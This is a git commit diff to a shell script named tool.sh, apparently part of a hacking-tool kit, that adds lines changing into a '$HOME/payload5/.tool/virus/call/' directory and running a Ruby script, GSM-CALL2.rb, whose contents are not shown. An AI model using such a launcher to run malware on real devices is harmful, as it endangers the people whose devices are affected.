660d463862d07bdbe9d0b8b0d9775a538fb640f4
alimaxali <39878027+alimaxali@users.noreply.github.com>
2019-06-20 10:20:55 -0700

    Update tool.sh

--- tool.sh
+++ tool.sh
@@ -5,3 +5,5 @@ cd
 rm -rif ali-max.key
 cp $HOME/payload5/.tool/virus/call/ali-max.key $HOME
 #cp $HOME/payload5/.tool/virus/call/GSM-CALL.rb $HOME
+cd $HOME/payload5/.tool/virus/call/
+ruby GSM-CALL2.rb
